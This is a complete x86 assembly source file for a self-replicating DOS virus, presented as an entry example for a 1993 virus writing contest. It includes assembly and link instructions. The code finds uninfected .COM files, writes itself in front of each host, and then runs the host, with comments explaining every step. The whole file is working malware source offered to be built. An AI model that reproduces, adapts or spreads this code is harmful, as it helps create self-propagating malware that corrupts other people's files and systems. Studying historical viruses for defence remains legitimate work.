﻿

;A small virus with minimal required functionality.

;An example for

;#######################################################
;#    THE FIRST INTERNATIONAL VIRUS WRITING CONTEST    #
;#                        1 9 9 3                      #
;#######################################################

;Assemble this file with TASM 2.0 or higher: "TASM LITTLE;"
;Link as "TLINK /T LITTLE;"

;Basic explanation of how this virus works:
;
;The virus takes control when the program first starts up. All of its code is
;originally located at the start of a COM file that has been infected. When
;the virus starts, it takes over a segment 64K above the one where the program
;was loaded by DOS. It copies itself up there, and then searches for an
;uninfected file. To determine if a file is infected, it checks the first two
;bytes to see if they are the same as its first two bytes. It reads the file
;into memory right above where it is sitting (at 100H in the upper segment).
;If not already infected, it just writes itself plus the file it infected back
;out to disk under the same file name. Then it moves the host in the lower
;segment back to offset 100H and executes it.


                .model  tiny            ;Tiny model to create a COM file

                .code

;DTA definitions
DTA             EQU     0080H           ;Disk transfer area
FSIZE           EQU     DTA+1AH         ;file size location in file search
FNAME           EQU     DTA+1EH         ;file name location in file search


                ORG     100H

;******************************************************************************
;The virus starts here.
VIRSTART:
                mov     ax,ds
                add     ax,1000H
                mov     es,ax                           ;upper segment is this one + 1000H
                mov     si,100H                         ;put virus in the upper segment
                mov     di,si                           ;at offset 100H
                mov     cx,OFFSET HOST-100H             ;size of virus
                rep     movsb                           ;this will louse the infection up if run under debug!
                mov     ds,ax                           ;set ds to high segment
                push    ds
                mov     ax,OFFSET FIND_FILE
                push    ax
                retf                                    ;jump to high memory segment

;Now it's time to find a viable file to infect. We will look for any COM file
;and see if the virus is there already.
FIND_FILE:
                mov     dx,80H                  ;move dta to high segment
                mov     ah,1AH                  ;so we don't trash the command line
                int     21H                     ;which the host is expecting
                mov     dx,OFFSET COMFILE
                mov     cx,3FH                          ;search for any file, no matter what attribute
                mov     ah,4EH                          ;DOS search first function
                int     21H
CHECK_FILE:     jc      ALLDONE                         ;no COM files to infect

                mov     dx,FNAME                        ;first open the file
                mov     ax,3D02H                        ;r/w access open file, since we'll want to write to it
                int     21H
                jc      NEXT_FILE                       ;error opening file - quit and say this file can't be used

                mov     bx,FSIZE
                mov     cx,[bx]                         ;get file size for reading into buffer
                mov     bx,ax                           ;put file handle in bx, and leave it there for the duration
                mov     dx,OFFSET HOST                  ;and read file in at HOST in new segment
                mov     ah,3FH                          ;DOS read function
                int     21H
                mov     ax,WORD PTR [HOST]
                jc      NEXT_FILE                       ;skip file if error reading it

                cmp     ax,WORD PTR [VIRSTART]          ;see if infected already
                jnz     INFECT_FILE                     ;nope, go do it

                mov     ah,3EH                          ;else close the file
                int     21H                             ;and fall through to search for another file

NEXT_FILE:      mov     ah,4FH                          ;look for another file
                int     21H
                jmp     SHORT CHECK_FILE                ;and go check it out

COMFILE         DB      '*.COM',0

;When we get here, we've opened a file successfully, and read it into memory.
;In the high segment, the file is set up exactly as it will look when infected.
;Thus, to infect, we just rewrite the file from the start, using the image
;in the high segment.
INFECT_FILE:
                xor     cx,cx
                mov     dx,cx                           ;reset file pointer to start of file
                mov     ax,4200H
                int     21H

                mov     ah,40H
                mov     dx,100H
                mov     di,FSIZE
                mov     cx,WORD PTR [di]                ;adjust size of file for infection
                add     cx,OFFSET HOST
                sub     cx,100H
                int     21H                             ;write infected file

                mov     ah,3EH                          ;close the file
                int     21H

;The infection process is now complete. This routine moves the host program
;down so that its code starts at offset 100H, and then transfers control to it.
ALLDONE:
                mov     ax,ss                   ;set ds, es to low segment again
                mov     ds,ax
                mov     es,ax
                push    ax                      ;prep for retf to host
                mov     dx,80H                  ;restore dta to low segment
                mov     ah,1AH                  ;for compatibility
                int     21H
                mov     si,OFFSET HOST          ;set up to move host back to
                mov     di,100H                 ;original location
                push    di
                mov     cx,0FFFAH               ;move code, but don't trash the stack
                sub     cx,OFFSET HOST
                rep     movsb                   ;move code
                retf                            ;and return to host

;******************************************************************************
;The host program starts here. This one is a dummy that just returns control
;to DOS.
HOST:           mov     ax,4C00H                ;Terminate, error code = 0
                int     21H

HOST_END:

                END     VIRSTART





